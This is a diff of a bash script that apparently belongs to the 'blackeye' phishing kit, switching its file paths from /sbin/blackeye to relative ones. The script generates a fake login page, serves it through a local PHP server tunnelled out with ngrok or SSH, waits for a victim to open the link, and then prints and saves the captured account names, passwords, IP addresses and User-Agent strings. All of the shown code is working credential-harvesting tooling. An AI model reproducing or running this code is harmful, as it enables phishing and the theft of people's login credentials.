@@ -231,37 +231,37 @@ pass_text="${pass_text:-${default_pass_text}}"
 read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
 sub_text="${sub_text:-${default_sub_text}}"
 
-echo "<!DOCTYPE html>" > /sbin/blackeye/sites/create/login.html
-echo "<html>" >> /sbin/blackeye/sites/create/login.html
-echo "<body bgcolor=\"gray\" text=\"white\">" >> /sbin/blackeye/sites/create/login.html
+echo "<!DOCTYPE html>" > sites/create/login.html
+echo "<html>" >> sites/create/login.html
+echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
 IFS=$'\n'
-printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> /sbin/blackeye/sites/create/login.html
+printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
 IFS=$'\n'
-printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> /sbin/blackeye/sites/create/login.html
+printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
 IFS=$'\n'
-printf '<input type="text" name="username" length=64>\n' >> /sbin/blackeye/sites/create/login.html
+printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
 IFS=$'\n'
-printf '<br><label>%s: </label>' $pass_text >> /sbin/blackeye/sites/create/login.html
+printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
 IFS=$'\n'
-printf '<input type="password" name="password" length=64><br><br>\n' >> /sbin/blackeye/sites/create/login.html
+printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
 IFS=$'\n'
-printf '<input value="%s" type="submit"></form>\n' $sub_text >> /sbin/blackeye/sites/create/login.html
-printf '</center>' >> /sbin/blackeye/sites/create/login.html
-printf '<body>\n' >> /sbin/blackeye/sites/create/login.html
-printf '</html>\n' >> /sbin/blackeye/sites/create/login.html
+printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
+printf '</center>' >> sites/create/login.html
+printf '<body>\n' >> sites/create/login.html
+printf '</html>\n' >> sites/create/login.html
 
 
 }
 
 catch_cred() {
 
-account=$(grep -o 'Account:.*' /sbin/blackeye/sites/$server/usernames.txt | cut -d " " -f2)
+account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' /sbin/blackeye/sites/$server/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat /sbin/blackeye/sites/$server/usernames.txt >> /sbin/blackeye/sites/$server/saved.usernames.txt
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m /sbin/blackeye/sites/%s/saved.usernames.txt\e[0m\n" $server
+cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
 killall ssh > /dev/null 2>&1
@@ -277,7 +277,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
 while [ true ]; do
 
 
-if [[ -e "/sbin/blackeye/sites/$server/usernames.txt" ]]; then
+if [[ -e "sites/$server/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
 
@@ -289,14 +289,14 @@ done
 }
 
 catch_ip() {
-touch /sbin/blackeye/sites/$server/saved.usernames.txt
-ip=$(grep -a 'IP:' /sbin/blackeye/sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+touch sites/$server/saved.usernames.txt
+ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-ua=$(grep 'User-Agent:' /sbin/blackeye/sites/$server/ip.txt | cut -d '"' -f2)
+ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
-cat /sbin/blackeye/sites/$server/ip.txt >> /sbin/blackeye/sites/$server/saved.ip.txt
+cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
 
 if [[ -e iptracker.log ]]; then
@@ -376,7 +376,7 @@ getcredentials
 ##
 serverx() {
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd /sbin/blackeye/sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
@@ -398,12 +398,12 @@ checkfound
 }
 
 startx() {
-if [[ -e /sbin/blackeye/sites/$server/ip.txt ]]; then
-rm -rf /sbin/blackeye/sites/$server/ip.txt
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
 
 fi
-if [[ -e /sbin/blackeye/sites/$server/usernames.txt ]]; then
-rm -rf /sbin/blackeye/sites/$server/usernames.txt
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
 
 fi
 
@@ -419,12 +419,12 @@ serverx
 ##
 
 start() {
-if [[ -e /sbin/blackeye/sites/$server/ip.txt ]]; then
-rm -rf /sbin/blackeye/sites/$server/ip.txt
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
 
 fi
-if [[ -e /sbin/blackeye/sites/$server/usernames.txt ]]; then
-rm -rf /sbin/blackeye/sites/$server/usernames.txt
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
 
 fi
 
@@ -465,7 +465,7 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd /sbin/blackeye/sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
@@ -503,7 +503,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e
 while [ true ]; do
 
 
-if [[ -e "/sbin/blackeye/sites/$server/ip.txt" ]]; then
+if [[ -e "sites/$server/ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
 catch_ip
 
